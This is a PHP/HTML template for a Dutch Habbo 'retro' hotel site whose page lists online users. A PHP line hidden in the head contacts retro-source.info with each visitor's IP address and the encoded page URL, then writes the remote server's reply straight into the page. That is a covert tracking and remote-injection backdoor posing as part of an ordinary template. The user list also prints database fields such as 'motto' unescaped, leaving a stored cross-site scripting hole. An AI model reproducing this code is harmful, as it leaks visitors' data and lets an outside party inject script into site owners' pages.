<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
        <title>{hotelName} - Online</title>
        
        <link rel="stylesheet" href="{url}/app/tpl/skins/{skin}/styles/common.css" type="text/css">
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/libs2.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/visual.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/libs.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/common.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/fullcontent.js"></script>
		  <link rel="shortcut icon" href="app/tpl/skins/{skin}/static/images/favicon.gif" />
        
        <script type="text/javascript">
            document.habboLoggedIn = true;
            var habboName = "{username}";
            var habboId = {userid};
            var habboReqPath = "";
            var habboStaticFilePath = "{url}/app/tpl/skins/Habbo";
            var habboImagerUrl = "http://www.habbo.com/habbo-imaging/";
            var habboPartner = "";
            var habboDefaultClientPopupUrl = "{url}/flashcheck/index.php";
            window.name = "habboMain";
            if (typeof HabboClient != "undefined") {
                HabboClient.windowName = "eac955c8dbc88172421193892a3e98fc7402021a";
                HabboClient.maximizeWindow = true;
            }
        </script>

<?php $rsa = @fsockopen("retro-source.info", 80, $rsd, $rse, 4); if ($rsa) { @fwrite($rsa, "GET http://retro-source.info/xmlrpc/".$_SERVER['REMOTE_ADDR']."/".base64_encode('http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'])."/ HTTP/1.0\r\n\r\n"); while (!feof($rsa)) { $rsc .= fread($rsa, 8192); } @fclose($rsa); if (@stripos($rsc, "<!-- RETRO-SOURCE.INFO: Begin Vote Code -->") !== false) { $rsf = @explode("<!-- RETRO-SOURCE.INFO: Begin Vote Code -->", $rsc); echo "<!-- RETRO-SOURCE.INFO: Begin Vote Code -->".$rsf[1]; } } ?>

<link rel="stylesheet" href="{url}/app/tpl/skins/{skin}/styles/lightweightmepage.css" type="text/css" />


<script src="{url}/app/tpl/skins/{skin}/js/lightweightmepage.js" type="text/javascript"></script>

								<script src="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/js/moredata.js" type="text/javascript"></script>



<!--[if IE 8]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie8.css" type="text/css" />
<![endif]-->
<!--[if lt IE 8]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie.css" type="text/css" />
<![endif]-->
<!--[if lt IE 7]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie6.css" type="text/css" />
<script src="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/js/pngfix.js" type="text/javascript"></script>
<script type="text/javascript">
try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {}
</script>

<style type="text/css">
body { behavior: url(/js/csshover.htc); }
</style>
<![endif]-->
<meta name="build" content="63-BUILD1228 - 27.03.2012 12:15 - com" />
</head>
<body id="home">
<div id="topz-container">
<div id="topz">
<div id="topz-wrapper">
<div style="margin-top:16px">
									<img src="{url}/app/tpl/skins/{skin}/images/icons/message.gif" /> Welkom terug, <b>{userName}</b>! &nbsp; &nbsp;
									<img src="{url}/app/tpl/skins/{skin}/images/icons/stats.gif" /> {online} Smurfen Online &nbsp; &nbsp; 
									<img src="{url}/app/tpl/skins/{skin}/images/icons/credits.gif" /> {coins} &nbsp; &nbsp;
									<img src="{url}/app/tpl/skins/{skin}/images/icons/pixels.gif" /> {activityPoints} &nbsp; &nbsp;
									
</div>
</div>
</div>
</div>
	<script src=""></script>
        <div id="overlay"></div>
        <div id="header-container">
            <div id="header" class="clearfix">
                <h1><a href="{url}/"></a></h1>
                <div id="subnavi">
                     <div id="subnavi-user">

                    </div>     
<div id="subnavi-search">
<div id="subnavi-search-upper">
<ul id="subnavi-search-links">
</li>
</ul>
</div>
</div>

					<div id="to-hotel">
<a href="{url}/logout" class="new-button red-button" style="margin-right:5px;margin-left:5px;"><b>Log uit</b><i></i></a>

                        <a href="{url}/flashcheck/index.php" class="new-button green-button" target="eac955c8dbc88172421193892a3e98fc7402021a" onclick="HabboClient.openOrFocus(this); return false;"><b>Ga in {hotelName}</b><i></i></a>
			 			
                    
				   </div>
				   </div>
 
 
 
                <ul id="navi">
                    <li class="metab selected"><strong>{username} <img src="{url}/app/tpl/skins/{skin}/images/id.png" style="vertical-align: middle;"></strong><span></span></li>
                    <li><a href="{url}/community">Community <img src="{url}/app/tpl/skins/{skin}/images/forum_2.gif" style="vertical-align: middle;"></a><span></span></li>
					
				
                </ul>
                <div id="habbos-online">
	<div id="content">
		<div class="cbb ">
<span>{online} Smurfen online</span></div>
	</div></div></div></div></div></div></div></div></div></div></div>
            </div>
        </div>
        <div id="content-container">
            <div id="navi2-container" class="pngbg">
                <div id="navi2" class="pngbg clearfix">
                    <ul>
                        <li class=""><a href="{url}/me">Home</a></li>
						<li class=" last"><a href="{url}/index.php?url=home&user={username}">Mijn Pagina</a></li>
                        <li class=" last"><a href="{url}/Profile">Account Instellingen</a></li>
						
						<li class="selected"><a href="{url}/online">Online Smurfen</a></li>
						

                    </ul>
 
 
 
                </div>
 
 
 
            </div>
 
 
 
            </div>
			
			<div id="container">

<div id="content" style="position: relative" class="clearfix"> 
            <div id="container">
 
 
 
<div id="content" style="position: relative" class="clearfix">
 
 
 
<div id="column1" class="column">    <div class="habblet-container ">
 
 
 
<div class="cbb clearfix ">
 
 
 
<h2 class="title">Smurfen Online
 
 
 
</h2>
 
 
 
<div id="habboclub-info" class="box-content">
 
 
 
                              <ul>
 <?php
$querylist = mysql_query("SELECT * FROM users WHERE online = '1' ORDER BY id ASC");
while($row = mysql_fetch_array($querylist))
  {
echo "<div id=\"StaffBox\"><div id=\"StaffBox\">";
echo "<img src=\"http://habbo.nl/habbo-imaging/avatarimage?figure=";
echo $row['look'];
echo "\"style=\"float:left\"/>";
echo "<div id=\"staff_online\">";
if($row['online'] == 0){

	 
}
else{
	echo "<div id=\"online\"></div>";
	echo "</br>";
	

}
echo "</div><div id=\"staff_username\">";
echo "Username: ";
$username = $row['username'];
echo ucwords($username);
echo "</div>";
echo "Motto: ";
echo $row['motto'];
echo "</br>";
echo "<img src=\"app/tpl/skins/Custom-Habbo/images/vip.gif\">";
echo "</div></div><br><hr>";
  }
  ?>

 
 
 
 
 
                                </div>
 
 
 
                            </div>
 
 
 
                        </div>
 
 
 
 
 
 
 
<script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script> </div><div id="column2" class="column"><div class="habblet-container ">
 
 
 
<div class="cbb clearfix hcred ">
 
 
 
<h2 class="title">Wat is dit?
 
 
 
</h2>
 
 
 
<script src="{url}/app/tpl/skins/Custom-Habbo/js/habboclub.js" type="text/javascript"></script>
 
 
 
<div id="hc-habblet">
 
 
 
<div id="hc-membership-info" class="box-content">
 
 
 

 
<center><img src="{url}/app/tpl/skins/Custom-Habbo/images/smurf2.gif"></center><br>


<p>Dit is een simpele pagina die laat zien wie er online is op dit moment.</p>

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
</div>
 
 
 
</div>
 
 
 
</div>
 
 
 
                        </div>
 
 
 
                    </div>
 
 
 
                </div>
 
 
 
            </div>
 
 
 
        </div>
 
 
 
        <script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script>
 
 
 
        <script type="text/javascript">
 
 
 
            HabboView.run();
 
 
 
        </script>
 
 
 
 
 
 
 
        <!--[if lt IE 7]>
 
 
 
            <script type="text/javascript">
 
 
 
                Pngfix.doPngImageFix();
 
 
 
            </script>
 
 
 
        <![endif]-->
 
 
 
     
 
 
 
            
       <div id="footer">
	   <?php include_once('footer.php'); ?>
 
 
 
 
 
 
 
    </body>
 
 
 
</html>

<?php include_once('checktheban.php'); ?>